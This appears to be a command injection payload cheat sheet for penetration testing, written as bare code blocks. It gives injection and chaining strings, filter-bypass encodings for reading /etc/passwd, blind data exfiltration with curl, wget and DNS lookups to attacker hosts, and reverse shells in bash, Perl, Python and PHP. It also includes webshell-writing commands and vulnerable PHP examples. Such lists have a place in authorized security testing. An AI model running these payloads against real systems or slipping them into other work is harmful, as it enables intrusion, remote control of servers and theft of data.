# Command Injection Payloads

## Basic Payloads

### Linux
```bash
; whoami
; cat /etc/passwd
; ls -la /
; id
; pwd
```

### Windows
```cmd
; whoami
; type C:\Windows\win.ini
; dir C:\
; ipconfig
; net user
```

## Chaining Commands

```bash
;ls
&& ls
|| ls
& ls &
| ls
\n whoami (newline)
`whoami`
$(whoami)
```

## Basic RCE

```bash
# Linux
;cat /etc/passwd
;ls -la
;id

# Blind
;curl https://attacker.com/?q=$(whoami)
;wget https://attacker.com/?q=$(whoami)
```

## Without Spaces

```bash
cat${IFS}/etc/passwd
ls${IFS}-la
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd';$X
```

## Bypass Filters

### Backslash newline
```bash
cat\
/et\
c/pa\
sswd
```

### Hex encoding
```bash
echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"
cat $(echo -e "\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")
xxd -r -p <<< 2f6574632f706173737764
```

### Quote bypass
```bash
w'h'o'am'i
wh''oami
"wh"oami
w"h"o"am"i
wh\`\`oami
```

### Variable expansion
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
/$($(echo -e "cat")) /etc/passwd
```

## Wildcards

```bash
# Linux
/???/??t /???/p??s??
/bin/cat /etc/passwd

# Windows
c:\*\*2\n??e\*d.*
```

## Time-Based Exfiltration

```bash
# Char by char
if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# DNS exfil
for i in $(ls /); do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

## Blind RCE

```bash
# No output - curl to attacker
curl https://attacker.com/?q=$(whoami)

# wget to attacker
wget https://attacker.com/?q=$(whoami)

# Time-based
ping -c 5 attacker.com
sleep 5
```

## Bypass Without Special Chars

### $IFS
```bash
cat${IFS}/etc/passwd
ls${IFS}-la
```

### Brace expansion
```bash
{cat,/etc/passwd}
{ls,-la}
{,echo,hello}
```

### ANSI-C
```bash
X=$'uname\x20-a'&&$X
```

## Reverse Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## File Write (Webshell)

```bash
# Linux
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Windows
echo ^<%%@Page Language="Jscript"%%^>^<%%eval(Request.Item["cmd"],"unsafe");%%^> > shell.aspx
```

## Command Injection Points

### Common vulnerable parameters
```
?q=ping&host=
&host=
&command=
&cmd=
&exec=
&system=
&ping=
&lookup=
&domain=
&url=
&target=
```

### Linux functions
```
system()
exec()
popen()
shell_exec()
passthru()
```

### PHP with user input
```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);

$domain = $_GET['domain'];
$output = shell_exec("nslookup " . $domain);
```

## Quick Reference

| OS | Command | Output |
|---|---|---|
| Linux | cat /etc/passwd | Show passwd |
| Linux | id | Show user info |
| Linux | pwd | Show dir |
| Win | type C:\\Windows\\win.ini | Show file |
| Win | whoami | Show user |
| Win | ipconfig | Show IP |